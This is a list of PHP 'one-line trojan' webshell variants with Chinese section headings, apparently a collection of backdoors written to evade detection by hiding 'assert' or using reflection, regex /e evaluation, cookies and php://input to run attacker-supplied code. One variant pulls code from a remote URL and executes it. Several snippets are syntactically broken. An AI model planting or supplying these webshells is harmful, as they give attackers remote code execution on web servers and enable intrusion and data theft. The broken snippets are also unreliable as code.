// 反射 - 一句话木马

<?php
class test extends ReflectionFunction{}
	$a = substr_replace("assxxx", "ert", 3);
	$f = new test($a);
	$f->invoke($_POST['x']);
?>

<?php
class test extends ReflectionFunction{}
	$a = @$_GET['token'];
	$f = new test($a);
	$f->invoke(@$_POST['x']);
?>

<?php
$a = substr_replace("assxxx", "ert", 3);
$function = new ReflectionFunction($a);
$function->invoke($_POST['x']);
?>

<?php
class test extends ReflectionFunction{
	$a = substr_replace("assxxx", "ert", 3);
	$f = new test($a);
	@$f->invokeArgs(array(($_POST['x']));
}
?>

// 正则匹配 - 一句话木马

<?php @preg_replace(array("/.*/e"), $_POST['x'], ""); ?>

<?php @preg_filter(array("/.*/e"), $_POST['x'], ""); ?>

<?php preg_replace_callback($at = array(''=>('/.+/i')), create_function('$a', 'return assert($a[0]);'), $_POST['x']); ?>


// 二维数组 - 一句话木马

<?php
$b = substr_replace("assexx", "rt", 4);
$c = $_POST['x'];
$a = array($arrayName = ($arrayName = ($arrayName = array('a' => $b($c)))));
?>


// 多种超全局变量配合 - 一句话木马

<?php
$a = substr_replace("assxxx", "ert", 3);
$COOKIE = $_COOKIE;
foreach ($COOKIE as $key => $value) {
	if($key == $a){
		$key($_POST['x']);
	}
}
?>

// 分离加载 - 一句话木马

<?php
assert($file_get_contents('http://www.baidu.com/1.txt')); ?>

// 伪协议 - 一句话木马

<?php 
$a = substr_replace("assxxx", "ert", 3);
$a(file_get_contents('php://input'));
?>


